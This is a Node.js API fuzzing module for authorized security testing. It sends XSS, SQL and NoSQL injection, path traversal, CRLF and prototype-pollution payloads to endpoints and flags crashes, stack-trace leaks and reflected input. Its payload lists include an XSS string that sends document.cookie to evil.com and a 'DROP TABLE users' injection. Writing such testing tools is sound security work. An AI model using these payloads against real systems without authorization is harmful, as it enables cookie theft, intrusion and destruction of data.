const https = require('https');
const http = require('http');
const { URL } = require('url');

/**
 * APIFuzzer - API endpoint fuzzing module for authorized security testing.
 *
 * Tests endpoints with malicious/malformed inputs to find vulnerabilities:
 *   - XSS payload reflection
 *   - SQL injection error leaks
 *   - NoSQL injection
 *   - Stack trace / debug info leaks
 *   - Server crashes (500 errors)
 *   - Type confusion & boundary values
 *   - Missing / extra fields
 *   - Special characters & encoding issues
 *
 * Uses only Node.js built-in http/https modules.
 */

const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><img onerror=alert(1) src=x>',
  "';alert(String.fromCharCode(88,83,83))//",
  '<svg onload=alert(1)>',
  '<img src=x onerror=alert(1)/>',
  'javascript:alert(1)',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '{{constructor.constructor("alert(1)")()}}',
  '${7*7}',
  '<details open ontoggle=alert(1)>',
  '<math><mtext><table><mglyph><svg><mtext><textarea><path d="M0"><img onerror=alert(1) src>',
  '"><svg/onload=fetch(`//evil.com?c=${document.cookie}`)>',
  '<a href="javascript:void(0)" onclick="alert(1)">click</a>',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '<div style="background:url(javascript:alert(1))">',
  "'-alert(1)-'",
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
];

const SQL_PAYLOADS = [
  "' OR 1=1--",
  "'; DROP TABLE users;--",
  "' UNION SELECT NULL,NULL,NULL--",
  "1' AND '1'='1",
  "' OR ''='",
  "1; SELECT * FROM information_schema.tables--",
  "' OR 1=1#",
  "admin'--",
  "1' ORDER BY 1--",
  "' WAITFOR DELAY '0:0:5'--",
];

const NOSQL_PAYLOADS = [
  { $gt: '' },
  { $ne: null },
  { $regex: '.*' },
  { $where: 'this.password.length > 0' },
  { $exists: true },
];

const SPECIAL_CHARS = [
  '\0',                         // null byte
  '\r\n\r\nInjected-Header: true', // CRLF injection
  '\u0000\u001f\uffff',        // unicode edge cases
  'A'.repeat(10000),           // very long string
  '\t\n\r',                    // whitespace chars
  '../../etc/passwd',          // path traversal
  '%00',                       // url-encoded null
];

class APIFuzzer {
  constructor(config) {
    this.baseUrl = (config.baseUrl || '').replace(/\/$/, '');
    this.endpoints = config.endpoints || [];
    this.timeout = config.timeout || 10000;
    this.headers = config.headers || {};
    this.concurrency = config.concurrency || 3;
    this.results = [];
  }

  /**
   * Fuzz all configured endpoints. Returns array of per-endpoint results.
   */
  async fuzzAll() {
    const allResults = [];
    for (const endpoint of this.endpoints) {
      const result = await this.fuzzEndpoint(endpoint);
      allResults.push(result);
    }
    this.results = allResults;
    return allResults;
  }

  /**
   * Fuzz a single endpoint with all payload variants.
   */
  async fuzzEndpoint(endpoint) {
    const { path: epPath, method = 'POST', body = {}, headers = {} } = endpoint;
    const url = this.baseUrl + epPath;
    const payloads = this._generatePayloads(body);

    const result = {
      endpoint: `${method} ${epPath}`,
      totalTests: payloads.length,
      passed: 0,
      failed: 0,
      vulnerabilities: [],
    };

    // Run fuzz payloads with controlled concurrency
    for (let i = 0; i < payloads.length; i += this.concurrency) {
      const batch = payloads.slice(i, i + this.concurrency);
      const batchResults = await Promise.allSettled(
        batch.map(({ label, fuzzedBody }) =>
          this._testPayload(url, method, fuzzedBody, { ...this.headers, ...headers }, label)
        )
      );

      for (const settled of batchResults) {
        if (settled.status === 'fulfilled') {
          const findings = settled.value;
          if (findings.length === 0) {
            result.passed++;
          } else {
            result.failed++;
            result.vulnerabilities.push(...findings);
          }
        } else {
          // Request itself failed (timeout, connection refused) - not a vulnerability
          result.passed++;
        }
      }
    }

    return result;
  }

  /**
   * Generate all fuzz variants from a base request body.
   */
  _generatePayloads(baseBody) {
    const payloads = [];
    const keys = Object.keys(baseBody);

    // 1. XSS payloads in each string field
    for (const key of keys) {
      if (typeof baseBody[key] === 'string') {
        for (const xss of XSS_PAYLOADS) {
          payloads.push({
            label: `xss:${key}`,
            fuzzedBody: { ...baseBody, [key]: xss },
          });
        }
      }
    }

    // 2. SQL injection in each string field
    for (const key of keys) {
      if (typeof baseBody[key] === 'string') {
        for (const sqli of SQL_PAYLOADS) {
          payloads.push({
            label: `sqli:${key}`,
            fuzzedBody: { ...baseBody, [key]: sqli },
          });
        }
      }
    }

    // 3. NoSQL injection in each field
    for (const key of keys) {
      for (const nosql of NOSQL_PAYLOADS) {
        payloads.push({
          label: `nosql:${key}`,
          fuzzedBody: { ...baseBody, [key]: nosql },
        });
      }
    }

    // 4. Type confusion for each field
    const typeConfusions = [null, undefined, '', 0, -1, true, false, [], {}, [null]];
    for (const key of keys) {
      for (const val of typeConfusions) {
        payloads.push({
          label: `type_confusion:${key}=${String(val)}`,
          fuzzedBody: { ...baseBody, [key]: val },
        });
      }
    }

    // 5. Boundary values for numeric fields
    const boundaryValues = [0, -1, -999999, Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER, NaN, Infinity, 1.7976931348623157e+308];
    for (const key of keys) {
      if (typeof baseBody[key] === 'number') {
        for (const val of boundaryValues) {
          payloads.push({
            label: `boundary:${key}=${val}`,
            fuzzedBody: { ...baseBody, [key]: val },
          });
        }
      }
    }

    // 6. Special characters in string fields
    for (const key of keys) {
      if (typeof baseBody[key] === 'string') {
        for (const sc of SPECIAL_CHARS) {
          payloads.push({
            label: `special_char:${key}`,
            fuzzedBody: { ...baseBody, [key]: sc },
          });
        }
      }
    }

    // 7. Missing required fields (one at a time)
    for (const key of keys) {
      const reduced = { ...baseBody };
      delete reduced[key];
      payloads.push({
        label: `missing_field:${key}`,
        fuzzedBody: reduced,
      });
    }

    // 8. Extra unexpected fields
    payloads.push({
      label: 'extra_field:__proto__',
      fuzzedBody: { ...baseBody, __proto__: { admin: true } },
    });
    payloads.push({
      label: 'extra_field:constructor',
      fuzzedBody: { ...baseBody, constructor: { prototype: { admin: true } } },
    });
    payloads.push({
      label: 'extra_field:admin',
      fuzzedBody: { ...baseBody, admin: true, role: 'admin', isAdmin: true },
    });

    // 9. Empty body
    payloads.push({ label: 'empty_body', fuzzedBody: {} });

    // 10. Body as array instead of object
    payloads.push({ label: 'body_as_array', fuzzedBody: [baseBody] });

    return payloads;
  }

  /**
   * Send a single fuzz payload and analyze the response for vulnerabilities.
   */
  async _testPayload(url, method, body, headers, label) {
    const findings = [];
    const bodyStr = JSON.stringify(body);

    let res;
    try {
      res = await this._request(url, {
        method,
        headers: { 'Content-Type': 'application/json', ...headers },
        body: bodyStr,
      });
    } catch (err) {
      // Network error / timeout is not a vulnerability finding
      return findings;
    }

    const responseBody = (res.body || '').toLowerCase();

    // Check 1: Server crash (500)
    if (res.status >= 500) {
      findings.push({
        type: 'server_crash',
        payload: label,
        response: { status: res.status, body: res.body.substring(0, 500) },
        severity: 'high',
      });
    }

    // Check 2: Stack trace leak
    const stackTracePatterns = [
      'at object.<anonymous>',
      'at module._compile',
      'at process._tickcallback',
      'at function.module._load',
      'node_modules/',
      'internal/modules/',
      'traceback (most recent call',
      '.py", line',
      'sqlstate[',
      'pg_query',
      'error: relation "',
      'syntaxerror:',
      'referenceerror:',
      'typeerror:',
      'prisma.', // ORM leak
    ];
    for (const pattern of stackTracePatterns) {
      if (responseBody.includes(pattern)) {
        findings.push({
          type: 'stack_trace_leak',
          payload: label,
          response: { status: res.status, body: res.body.substring(0, 500) },
          severity: 'high',
        });
        break;
      }
    }

    // Check 3: SQL error messages leak
    const sqlErrorPatterns = [
      'sql syntax',
      'mysql_',
      'postgresql',
      'sqlite3',
      'odbc driver',
      'unclosed quotation mark',
      'quoted string not properly terminated',
      'you have an error in your sql',
      'ora-',
      'pg::',
    ];
    if (label.startsWith('sqli:')) {
      for (const pattern of sqlErrorPatterns) {
        if (responseBody.includes(pattern)) {
          findings.push({
            type: 'sql_error',
            payload: label,
            response: { status: res.status, body: res.body.substring(0, 500) },
            severity: 'critical',
          });
          break;
        }
      }
    }

    // Check 4: XSS reflection
    if (label.startsWith('xss:')) {
      // Extract the actual XSS payload from the fuzzed body
      const xssPayload = this._extractPayloadValue(body, label);
      if (xssPayload && res.body.includes(xssPayload)) {
        const contentType = res.headers['content-type'] || '';
        // Only flag if response could be rendered as HTML
        if (contentType.includes('html') || !contentType.includes('json')) {
          findings.push({
            type: 'xss_reflection',
            payload: label,
            response: { status: res.status, body: res.body.substring(0, 500) },
            severity: 'critical',
          });
        }
      }
    }

    // Check 5: NoSQL injection indicators
    if (label.startsWith('nosql:')) {
      // If the server accepted the object-payload as a query operator
      // and returned data rather than a validation error, flag it
      if (res.status === 200 && responseBody.length > 2) {
        try {
          const parsed = JSON.parse(res.body);
          const hasData = Array.isArray(parsed)
            ? parsed.length > 0
            : (parsed.data && (Array.isArray(parsed.data) ? parsed.data.length > 0 : true));
          if (hasData) {
            findings.push({
              type: 'nosql_injection',
              payload: label,
              response: { status: res.status, body: res.body.substring(0, 500) },
              severity: 'critical',
            });
          }
        } catch {
          // Not JSON, ignore
        }
      }
    }

    return findings;
  }

  /**
   * Extract the fuzz payload value from the body object, given the label.
   */
  _extractPayloadValue(body, label) {
    // label format: "xss:fieldName" or "sqli:fieldName"
    const parts = label.split(':');
    if (parts.length < 2) return null;
    const key = parts[1];
    const val = body[key];
    return typeof val === 'string' ? val : null;
  }

  /**
   * HTTP/HTTPS request helper. Returns { status, headers, body }.
   */
  _request(url, options = {}) {
    return new Promise((resolve, reject) => {
      const parsedUrl = new URL(url);
      const mod = parsedUrl.protocol === 'https:' ? https : http;

      const reqOpts = {
        method: options.method || 'GET',
        headers: options.headers || {},
        timeout: this.timeout,
      };

      const req = mod.request(url, reqOpts, (res) => {
        let body = '';
        res.on('data', (chunk) => (body += chunk));
        res.on('end', () => {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body,
          });
        });
      });

      req.on('timeout', () => {
        req.destroy();
        reject(new Error(`Request timeout: ${url}`));
      });

      req.on('error', (err) => reject(err));

      if (options.body) req.write(options.body);
      req.end();
    });
  }
}

module.exports = APIFuzzer;
